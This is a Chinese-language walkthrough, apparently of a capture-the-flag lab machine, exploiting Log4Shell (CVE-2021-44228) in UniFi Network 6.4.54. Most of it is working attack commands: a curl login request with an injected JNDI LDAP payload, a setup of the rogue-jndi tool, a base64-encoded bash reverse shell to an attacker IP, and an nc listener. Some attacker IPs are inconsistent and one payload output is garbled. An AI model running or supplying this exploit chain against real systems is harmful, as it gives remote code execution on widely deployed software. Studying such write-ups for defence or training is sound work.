###  一、信息收集

1. nmap扫描

```shell
    nmap -sC -sV -v  10.129.150.132
    # 出现端口 22,6789,8080,8443
    # 可能利用思路：
    # 1. 对ssh服务进行弱口令爆破，概率不大
    # 2. 8080端口为web界面，跳转到8443端口，从这点突破
```

2.  url利用
```shell
 https://10.129.150.132:8443/manage/account/login?redirect=%2Fmanage
 # 该页面为登录页面
 # 尝试文件包含漏洞，但是无效
```

3. 敏感信息利用
```shell
    UniFi Network 6.4.54
    # 标题和界面都出现该信息，尝试网络搜索发现可能存在 log4J 漏洞利用（CVE-2021-44228）  
```

### 二、漏洞利用
因为存在 log4J 漏洞利用（CVE-2021-44228），所以利用该漏洞获取webshell，按照网络提供的工具和步骤进行操作

1.  验证漏洞是否存在
- 获取注入请求包
```shell
    # 因为登录页面，尝试登录后抓取请求包，并转化为`curl`访问模式
    curl 'https://10.129.215.139:8443/api/login' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 6666666666OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15' -H 'Accept: */*' -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' --compressed -H 'Referer: https://10.129.215.139:8443/manage/account/login?redirect=%2Fmanage' -H 'Content-Type: application/json; charset=utf-8' -H 'Origin: https://10.129.215.139:8443' -H 'Connection: keep-alive' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw '{"username":"admin","password":"admin","remember":true,"strict":true}'
```
>  根据该数据包进行验证和利用

- 准备payload
```shell
 # 只需要更改数据体
 --data-raw '{"username":"admin","password":"admin","remember":true,"strict":true}'
 # 返回结果：{"meta":{"rc":"error","msg":"api.err.Invalid"},"data":[]} 
 调整为
 --data-raw '{"username":"admin","password":"admin","remember":"${jndi:ldap://10.10.17.49/whatever}","strict":true}'
 # 返回结果："meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}  
```

- 监听本地端口
```shell
    tcpdump -i tun0 port 389  
    # tun0:本地接口
    # 如果389有数据返回，则证明存在该漏洞，可以进行利用
 ```


2. 漏洞利用
-  工具利用环境安装
```shell
    # 准备工具rogue-jndi的环境
    apt install openjdk-11-jdk -y
    apt install maven
    # 下载和安装工具rogue-jndi,并构建工具RogueJndi-1.1.jar
    git clone https://github.com/veracode-research/rogue-jndi
    cd rogue-jndi
    mvn package
```

-  准备反弹shell
```shell
    # 对反弹shell进行base64编码
    echo 'bash -c bash -i >&/dev/tcp/10.10.17.49/4444 0>&1' | base64
    # 结果：YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTcuNDkvNDQ0NCAwPiYxCg==
```

- 启动监听端口来获取反弹shell
> nc -lvnp 4444

- 利用工具生成payload
```shell
    #运行脚本获取payload
    java -jar target/RogueJndi-1.1.jar --command "bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
d}|{bash,-i}" --hostname "10.10.14.33"
    # 结果: ${jndi:ldap://10.10.14.331389/o=tomcat} 
```

因此,只要把该利用payload替换，校验payload就可以获取webshell